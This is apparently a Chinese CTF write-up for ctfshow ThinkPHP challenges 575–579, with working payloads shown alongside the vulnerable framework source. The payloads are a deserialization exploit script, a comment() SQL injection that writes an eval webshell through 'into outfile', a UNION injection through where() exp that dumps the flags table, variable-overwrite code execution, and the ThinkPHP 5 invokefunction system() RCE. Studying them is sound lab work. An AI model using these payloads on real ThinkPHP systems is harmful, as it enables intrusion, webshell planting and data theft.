<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$user</span> <span class="token operator">||</span> <span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">id</span><span class="token operator">!==</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>这里需要谷歌的是<a href="https://www.kancloud.cn/manual/thinkphp/1696" target="_blank" rel="noopener noreferrer">模块化设计<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>在源码里出现了一次<code>M('Users')</code>，说明使用了<code>Model</code>模块，在tp框架中，Model模块定义在Thinkphp下，如果要玩非预期的打法，需要继承一下<code>Think\Model</code>，在反序列化时会找不到类，导致反序列化失败</p> <p><img src="/medias/show-think/24.png" alt="24"></p> <p>如果反序列化成功且传入的id和反序列化的id相同，会直接渲染反序列化对象$user的username属性。在if条件语句里执行了<code>M('Users')</code>，使用反序列化恢复了一个<code>Model</code>对象，可以知道，需要使用<code>Model</code>类</p> <p><img src="/medias/show-think/25.png" alt="25"></p> <p>只需要控制$username属性，就可以实现渲染php代码</p> <p>exp:</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Think</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token operator">=</span><span class="token string single-quoted-string">'2'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'paylaod$： '</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>base64结果可以url编码一下更好</p> <p><img src="/medias/show-think/26.png" alt="26"></p> <p><img src="/medias/show-think/27.png" alt="27"></p> <p>另外一种<code>需要拿shell，稍微有点难</code>，看其他师傅博客的poc好长，等我变成tp大佬就回来分析(星星眼)</p> <h2 id="web-576"><a href="#web-576" class="header-anchor">#</a> web 576</h2> <blockquote><p>描述：注释注入，需要拿shell</p></blockquote> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">comment</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>调用了<code>comment()</code>方法，项目源码里审计一下，审计了个寂寞</p> <p><img src="/medias/show-think/28.png" alt="28"></p> <p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1750" target="_blank" rel="noopener noreferrer">thinkphp3 comment<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>看到了吗，<code>comment()</code>方法里的内容直接左右拼接注释符<code>/**/</code>，最后再拼接到原语句的最后，可以坏坏！！</p> <p>我们在<code>comment()</code>方法里传入<code>/*</code>、<code>*/</code>，就可以闭合<code>comment()</code>方法里的注释符，在最后的拼接环节实现sql注入</p> <p><img src="/medias/show-think/29.png" alt="29"></p> <p>尝试闭合前半部分，让sql报错</p> <p><img src="/medias/show-think/30.png" alt="30"></p> <p>闭合后半部分后，正常查询，当然，后半部分也可以直接通过<code>#</code>注释掉</p> <p><img src="/medias/show-think/31.png" alt="31"></p> <p>那么，在两个注释之间的内容就是我们拼接到sql语句里的可控部分了，这里似乎不存在堆叠注入，道友们可以尝试一下</p> <p>在这个sql语句里，<code>intval($id)</code>查询了一个id，返回结果是当前表里的内容，不可控了。我们可以控制sql语句结束时的操作，例如：把查询内容写进文件，可以控制文件名，实现写一个木马，使用mysql的骚操作，更改间隔符，填充木马内容。如此，在sql查询内容受限的添加下写入木马</p> <p><a href="https://www.runoob.com/mysql/mysql-database-import.html" target="_blank" rel="noopener noreferrer">Mysql指定文件分隔符<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/show-think/32.png" alt="32"></p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">*</span><span class="token operator">/</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/1.php'</span> <span class="token keyword">LINES</span> <span class="token keyword">STARTING</span> <span class="token keyword">BY</span> <span class="token string">'&lt;?php highlight_file(__FILE__);eval($_GET[1]);?&gt;'</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/show-think/33.png" alt="33"></p> <h2 id="web-577"><a href="#web-577" class="header-anchor">#</a> web 577</h2> <blockquote><p>描述：flag在数据库里</p></blockquote> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$map</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span>
<span class="token string single-quoted-string">'id'</span><span class="token operator">=&gt;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Users'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>谷歌一下<a href="https://www.kancloud.cn/manual/thinkphp/1735" target="_blank" rel="noopener noreferrer">thinkphp3 where(<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/show-think/34.png" alt="34"></p> <p>在官方文档里可以学习到</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$map</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'字段1'</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'表达式'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'查询条件1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$map</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'字段2'</span><span class="token punctuation">]</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'表达式'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'查询条件2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$Model</span><span class="token operator">-&gt;</span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 也支持</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>那么是不是等效：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$map</span> <span class="token operator">=</span> <span class="token function">arrray</span><span class="token punctuation">(</span>
    <span class="token string double-quoted-string">&quot;字段1&quot;</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'表达式'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'查询条件1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">&quot;字段2&quot;</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'表达式'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'查询条件2'</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>到这里，你有思路了吗？<code>$_GET[id]</code>可以是一个数组类型，数组的第一个值作为表达式，第二个值作为查询条件！！再回顾一下这个图，思考这个<code>$map</code>是怎么和<code>where</code>一起使用的</p> <p><img src="/medias/show-think/34.png" alt="34"></p> <p>我的看法是：sql语句中的where会根据指定的<code>表达式</code>类型，选择<code>字段</code>和<code>查询条件</code>的处理逻辑</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code><span class="token keyword">where</span> 字段?查询条件<span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>  
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>选择<code>exp</code>类型，那么查询条件可以使用一条sql语句！</p> <p>开搞，根据报错信息，合理调整，注意前面多补个<code>=</code>等号，把字段和查询语句拼接起来</p> <p><img src="/medias/show-think/35.png" alt="35"></p> <p>第二个是回显位，开！！！</p> <div class="language-sql line-numbers-mode"><pre class="language-sql"><code>?id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>exp<span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token operator">%</span><span class="token number">23</span>
?id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>exp<span class="token operator">&amp;</span>id<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">=</span><span class="token number">0</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>flag4s<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">from</span> flags<span class="token operator">%</span><span class="token number">23</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="web-578"><a href="#web-578" class="header-anchor">#</a> web 578</h2> <blockquote><p>描述：变量覆盖导致rce</p></blockquote> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$from</span><span class="token operator">=</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>下面要献丑了，过两天一定学vscode或者phpstorm动调</p> <p>在tp框架里查找<code>assign()</code>方法的定义，没什么敏感内容。不过注释里写<code>模板变量赋值</code>，往下看有没有模板解析</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">[</span><span class="token variable">$name</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><img src="/medias/show-think/36.png" alt="36"></p> <p>下面定义了一个解析的<code>fetch()</code>函数，解析模板输出内容，重点：里面多次使用了extract函数覆盖变量，多次使用文件包含模板文件，或者使用eval解析php内容</p> <p><img src="/medias/show-think/37.png" alt="37"></p> <p>截取部分<code>fetch()</code>函数代码，看到如果<code>$this-&gt;tVar['content']</code>存在，那么<code>extract()</code>函数会覆盖当前作用域的变量，然后<code>eval()</code>函数解析php代码，回去看<code>assign()函数</code>，看看<code>$this-&gt;tVar['content']</code>是怎么来的</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$__content__</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?&gt;'</span> <span class="token operator">.</span> <span class="token variable">$__content__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?&gt;'</span> <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>在这个<code>assign()函数</code>里，判断在属性<code>$this-&gt;tVar</code>里是否存在第一个参数，如果不存在，使用<code>array_merge($this-&gt;tVar, $name);</code>给<code>$this-&gt;tVar</code>添加新属性和值，如果存在，直接把参数值<code>$value</code>赋值给<code>$this-&gt;tVar</code>，总之会把$name赋值给<code>$this-&gt;tVar</code>。我们可以给他一个<code>content</code>参数，渲染php代码</p> <p>::: dangerous
fu*k，白忙活了，我说怎么跟别的师傅环境不一样，我还一直以为我的是tp3.2.3，原来是tp3.2.5，天塌了
:::</p> <p><a href="https://github.com/top-think/thinkphp/releases/tag/3.2.3" target="_blank" rel="noopener noreferrer">v3.2.3项目地址<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>ok啊，不好意思。让我们重新开始，tp323和tp325版本只有这个<code>fetch</code>函数稍有不同</p> <p>fetch函数：</p> <p>extract() 是 PHP 的一个内置函数，它将数组 $this-&gt;tVar 中的键值对转换为独立的 PHP 变量，如果<code>$this-&gt;tVar</code>数组里有<code>_content</code>属性，那么会覆盖当前作用域的<code>_content</code>变量，<code>eval('?&gt;' . $_content);</code>解析执行一个php代码</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 使用PHP原生模板</span>
            <span class="token variable">$_content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
            <span class="token comment">// 模板阵列变量分解成为独立变量</span>
            <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 直接载入PHP模板</span>
            <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">include</span> <span class="token variable">$templateFile</span> <span class="token punctuation">:</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?&gt;'</span> <span class="token operator">.</span> <span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>所以直接在这里传值覆盖一下<code>$this-&gt;assign($name,$from);</code></p> <p>因为assgin的if判断两种格式总之都是给属性<code>$this-&gt;tVar</code>添加新属性，所以payload有两种写法</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>?name[_content]=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
?name=_content&amp;from=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="web-579"><a href="#web-579" class="header-anchor">#</a> web 579</h2> <blockquote><p>描述：未开启强制路由RCE</p></blockquote> <p>在tp官方文档里了解到了<code>强制模式</code>，像<code>flask</code>框架一样，只有定义的路由可以正常访问，否则抛出异常</p> <p><img src="/medias/show-think/39.png" alt="39"></p> <p>在网上找到了<a href="https://www.modb.pro/db/501435" target="_blank" rel="noopener noreferrer">相关文章及poc<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，强制路由RCE漏洞Thinkphp5<code>5.0.0 - 5.1.30 远程代码执行（路由处理漏洞）</code></p> <p><img src="/medias/show-think/38.png" alt="38"></p> <p>其他师傅博客wp里的<code>payload</code>：<code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code>，跟着到源项目里跟一下漏洞点</p> <p><a href="https://github.com/top-think/framework/tree/v5.1.28" target="_blank" rel="noopener noreferrer">v5.1.28项目地址<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>在本地用phpstudy的composer在www目录搭个tp5.0.*的环境</p> <div class="language-shell line-numbers-mode"><pre class="language-shell"><code><span class="token function">composer</span> create-project topthink/think<span class="token operator">=</span><span class="token number">5.0</span>.* tp5  --prefer-dist
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在源码里找到了漏洞点！！在<code>./tp5/thinkphp/library/think/App.php</code>中，定义了payload里利用的<code>invokefunc</code>方法</p> <p>这个 invokeFunction 方法通过<code>反射机制</code>动态调用一个函数，同时可以灵活绑定参数。它的核心功能是接受一个函数名和参数列表（<code>数组</code>），然后使用 PHP 的 ReflectionFunction 来安全地调用该函数，这个函数要可以处理数组，要达到rce的目标，可以使用<code>call_user_func_array</code>函数</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">invokeFunction</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$vars</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$reflect</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>ReflectionFunction</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$args</span>    <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token function">bindParams</span><span class="token punctuation">(</span><span class="token variable">$reflect</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 记录执行信息</span>
    <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$debug</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">Log</span><span class="token operator">::</span><span class="token function">record</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'[ RUN ] '</span> <span class="token operator">.</span> <span class="token variable">$reflect</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token variable">$reflect</span><span class="token operator">-&gt;</span><span class="token function">invokeArgs</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
